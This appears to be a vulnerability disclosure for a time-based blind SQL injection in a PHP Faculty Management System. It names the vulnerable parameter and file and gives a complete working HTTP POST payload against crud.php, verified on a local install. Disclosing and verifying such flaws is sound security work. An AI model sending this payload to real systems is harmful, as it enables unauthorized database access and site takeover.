# Faculty Management System has SQL injection vulnerabilities

Source code download：https://code-projects.org/faculty-management-system-in-php-with-source-code/

version：2023/12/20

Vulnerability Description: The system has an SQL injection vulnerability, which allows attackers to obtain database information and gain website control permissions by inserting malicious SQL statements.

Cause of vulnerability: The vulnerability appears on line gan/admin/php/functions.php:34, where the fieldname parameter comes from user controlled input and is concatenated into an SQL query statement, resulting in SQL injection

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312221555886.png)

And the value of fieldname comes from the data of the post received by crud

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312221555887.png)

Vulnerability verification: access local port 80 after the system is built

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312221555888.png)

Send payload：

```
POST /gan/admin/php/crud.php HTTP/1.1
Host: 192.168.211.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 128
Accept: */*
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: PHPSESSID=da6muj6v42l26djau9bqi70j56
Origin: http://192.168.211.1
Referer: http://192.168.211.1/gan/admin/pages/teachers.php
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

action=validate&fieldname=%28select%2Afrom%28select%2Bsleep%282%29union%2F%2A%2A%2Fselect%2B1%29a%29&string=1&tablename=teachers
```

The response time was 2 seconds, as expected：

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312221555890.png)

Validate using sqlmap：

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312221555891.png)
